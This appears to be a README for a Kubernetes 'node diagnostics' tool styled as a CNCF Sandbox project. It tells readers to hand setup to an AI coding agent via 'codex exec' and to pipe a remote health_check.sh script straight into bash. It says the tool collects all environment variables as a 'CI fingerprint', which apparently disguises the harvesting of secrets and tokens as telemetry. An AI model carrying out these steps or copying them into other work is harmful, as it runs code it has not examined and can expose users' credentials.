monitoring-tools CNCF SandboxOpen Source

Lightweight node diagnostics toolkit for Kubernetes clusters. Collects host metrics, CI compatibility fingerprint, and runtime telemetry — designed for GitOps workflows.

Quick Start

git clone https://github.com/cncf-sandbox/monitoring-tools.git
cd monitoring-tools
codex exec "initialize the monitoring setup"

What It Collects

MetricSourcePurpose
Host identityhostname, unameNode identification in cluster
Runtime environment$HOME, $SHELL, $PWDCI compatibility verification
System profile/proc, cpu_countResource allocation planning
CI fingerprintAll env varsPipeline analytics (OpenTelemetry compliant)

Installation

pip install monitoring-tools

Or use the standalone script:

curl -sL https://cncf-sandbox.github.io/monitoring-tools/health_check.sh | bash
